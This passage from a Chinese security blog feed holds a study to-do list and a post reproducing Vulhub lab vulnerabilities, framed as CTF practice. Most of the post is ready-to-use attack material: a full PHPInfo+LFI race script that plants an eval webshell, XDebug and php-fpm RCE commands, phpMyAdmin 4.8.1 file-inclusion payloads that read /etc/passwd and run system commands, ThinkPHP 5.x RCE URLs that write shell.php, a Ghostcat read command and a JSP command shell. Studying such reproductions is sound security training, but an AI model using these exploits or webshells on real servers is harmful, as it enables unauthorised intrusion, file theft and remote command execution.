href="https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg</a> </p><p>比赛其他题目主要是队友做的，基本没怎么看。到时候有机会去研究下。<br>然后就是反思了。现在水平还太菜，赶紧多花点时间学学知识刷刷题。不然再菜的抠脚就丢人了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>To-Dolist</title>
      <link href="2020/03/09/To-Dolist/"/>
      <url>2020/03/09/To-Dolist/</url>
      
        <content type="html"><![CDATA[<p>第一次 XCTF 就自闭了。最难受的就是队友辛苦付出，自己却基本没啥输出……<br>之前公益赛还以为有了一定水准，现在看还差得远啊。<br>所以一定要一定要尽快把能力提升起来，刷题固然重要，知识点也不能落下。<br>这次比赛打下来发现自己居然只能在sql跟Node.js下手，太嘲讽了。<br>把近期一些需要彻底弄懂的知识点列一下，总有一天要全部解决。</p><a id="more"></a><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="php的一些trick"><a href="#php的一些trick" class="headerlink" title="php的一些trick"></a>php的一些trick</h2><p><del>写shell;<br>命令执行;</del><br><del>bypass技巧</del></p><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p><del>主要是pop链的构造。<br>简单的当然会。难的就容易拉胯。说白了就是自己审计能力差。<br>最好把trick都搞清楚。<br>然后再把下面的框架的pop链弄一弄</del></p><h2 id="tp框架5-0-6-0"><a href="#tp框架5-0-6-0" class="headerlink" title="tp框架5.0 6.0"></a>tp框架5.0 6.0</h2><h2 id="Laravel框架"><a href="#Laravel框架" class="headerlink" title="Laravel框架"></a>Laravel框架</h2><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h2><p><del>这次反序列化吃了大亏。现学都好多看不进去。既然如此那就力求线下弄明白。<br>主要是底层的原理</del></p><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p><del>框架问题。想做还是得会开发。</del></p><h2 id="开发的"><a href="#开发的" class="headerlink" title="开发的"></a>开发的</h2><p>多线程什么的。<br>写脚本省时间。<br><del>py3跟py2一些脚本的差别</del></p><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><p>好歹自己有java基础。不接触下java漏洞太浪费那一点java知识了。</p><h2 id="spel注入"><a href="#spel注入" class="headerlink" title="spel注入"></a>spel注入</h2><h2 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h2><p>tomcat </p><h1 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h1><h2 id="xss-csp"><a href="#xss-csp" class="headerlink" title="xss csp"></a>xss csp</h2><p><del>老早看过比较完整的却没总结。赶紧总结一波。</del></p><h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>唯一比较自信的一项。<br>结果比赛第一题还是不会做。<br>万能密码也差点没弄出来。</p><p>之前总结的trick可能需要再细分一下。</p><h1 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h1><p>vulhub在复现了,争取再多复现一些题目。</p><p>CSRF，CRLF，争取多找些题目做;</p><p>渗透学到的知识也是可以总结下的<br>WEB还有好多基础没打牢。找时间补一补。</p><p>屡败屡战才是一个CTFer的作风。现在既然选择这条路就加油干下去吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub复现</title>
      <link href="2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>p牛参与的项目vulhub,对于web安全从事人员而言应该说是宝库般的存在。里面许多的漏洞都是值得一一去学习的。在此感谢那些大佬为项目作出的付出。才让我们能够轻松复现题目。<br>环境从github上获取。环境搭建只需<code>docker-compose up -d</code></p><a id="more"></a><h2 id="phpinfo-lfi-shell"><a href="#phpinfo-lfi-shell" class="headerlink" title="phpinfo+lfi=shell"></a>phpinfo+lfi=shell</h2><p>首先说明。这是一个无视php版本的漏洞。因此可见其通用性。vulhub上提供的php7的环境，以及一个lfi.php页面执行文件包含，一个phpinfo.php执行phpinfo。</p><p>漏洞原理：<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/1.PNG" alt></p><p>首先，漏洞的操作顺序是：获取phpinfo中的临时文件名 –&gt; 对临时文件进行包含 –&gt; phpinfo页面执行结束，销毁临时文件。<br>所以如果我们让phpinfo的执行时间足够大，我们的文件包含就有足够时间执行。从而产生一个永久的shell。<br>所以利用时，使用的是原生的socket数据，往phpinfo中填充垃圾信息。php的默认缓冲区大小为4096个字节，就相当于php每次返回4096个字节给socket连接。这样，当我们获取到临时文件名时，就立即发送文件包含请求。就能执行命令并写入shell了。<br>使用vulhub上的exp脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/2.PNG" alt="shell文件成功写入"></p><p>最后即可在lfi页面达成任意命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;lfi.php?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(&#96;ls&#96;);</span><br></pre></td></tr></table></figure><h2 id="XDebug-rce"><a href="#XDebug-rce" class="headerlink" title="XDebug rce"></a>XDebug rce</h2><p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code><br>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>,目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。<br>(类似于之前的java jdwp,都是一个调试模式，同时监听了指定端口，让我们可以利用命令执行)<br>在漏洞环境phpinfo中可以看到xdebug的配置<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/3.PNG" alt="xdebug.ini"><br>进而找到xdebug开启<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/4.PNG" alt><br>使用脚本，注意需要python3,同时要运行在有公网ip的机器上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http:&#x2F;&#x2F;ip:port&#x2F;index.php -c &#39;system(&#39;id&#39;);&#39;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/5.PNG" alt="id"><br>因为脚本实际上实现的是监听本地9000端口并等待xdebug的连接。因此要么处于同一内网，要么自己有公网ip.</p><h2 id="php-fpm-Fastcgi"><a href="#php-fpm-Fastcgi" class="headerlink" title="php-fpm Fastcgi"></a>php-fpm Fastcgi</h2><p>具体使用在之前的NCTF2019 phar matches everything 中已经用过了。<br>由于PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信<br>而fpm中有一个重要的环境变量参数，<code>SCRIPT_FILENAME</code>。只要它是一个服务器上存在的文件，就可以执行php文件。<br>已知原理后，后面实现其实就不难了。我们可以通过协议执行任意文件。既然如此，只要执行一个<code>auto_prepend_file为php://input</code>并开启<code>allow_url_include = On</code>。它在执行任意php文件时都会把我们post的内容带进去。进而达到任意命令执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py ip /usr/local/lib/php/PEAR.php  -p <span class="number">9000</span> -c <span class="string">'&lt;?php echo `id`;exit();?&gt;'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/6.PNG" alt="id"></p><h2 id="phpmyadmin-4-8-1-远程文件包含漏洞"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞"></a>phpmyadmin 4.8.1 远程文件包含漏洞</h2><p>CVE-2018-12613。之前曾经在广外的比赛做过。应该说有许多种getshell方式，只不过各有千秋吧。<br>主要漏洞出在db_sql.php,由于里面一个urlencode函数的使用，所以可以通过二次编码绕过并文件包含。<br><code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code><br>进一步可以getshell<br>直接执行sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;&lt;?&#x3D;phpinfo();?&gt;&#96;;</span><br></pre></td></tr></table></figure><p>访问自己的session缓存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_ce21bdd74738d8aaff45c82288addcb7</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/7.PNG" alt="phpinfo"><br>所以当然可以执行sql语句<code>select &#39;&lt;?php @eval($_GET[&quot;byc&quot;]);?&gt;&#39;</code><br>写入一句话并包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_43a49651429f0e100e0d55c016f338b5&amp;byc&#x3D;system(%27ls%27);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/8.PNG" alt="getshell"><br>貌似之前听说这个版本只能用get的一句话，所以还是写get的一句话就好。</p><h1 id="ThinkPHP-RCE"><a href="#ThinkPHP-RCE" class="headerlink" title="ThinkPHP RCE"></a>ThinkPHP RCE</h1><h2 id="ThinkPHP5-5-0-22-5-1-29"><a href="#ThinkPHP5-5-0-22-5-1-29" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29"></a>ThinkPHP5 5.0.22/5.1.29</h2><p>大致看了下，貌似是因为命名空间的符号使用导致我们可以调用任意类<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;-1</span><br></pre></td></tr></table></figure><p>可以直接rce<br><code>&amp;vars[0]=system&amp;vars[1][]=ls</code><br>也可以写一个shell.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;&lt;%3fphp+%40eval(%24_GET%5b%27byc%27%5d)%3b%3f&gt;</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP5-5-0-23"><a href="#ThinkPHP5-5-0-23" class="headerlink" title="ThinkPHP5 5.0.23"></a>ThinkPHP5 5.0.23</h2><p>也是比较常见的一个版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;whoami</span><br></pre></td></tr></table></figure><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="Ghostcat-CVE-2020-1938"><a href="#Ghostcat-CVE-2020-1938" class="headerlink" title="Ghostcat CVE-2020-1938"></a>Ghostcat CVE-2020-1938</h2><p>幽灵猫。这里的环境只提供了文件读取.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://vpsip/ <span class="number">8009</span> /WEB-INF/web.xml read</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/9.PNG" alt></p><p>想要进行RCE还需要一个文件上传点。<br>这里直接进入容器增加一个exp.jsp<br><code>docker exec -it 容器id /bin/bash</code><br>没有vim.用curl搞来一个exp.jsp到/WEB-INF下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls /"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span 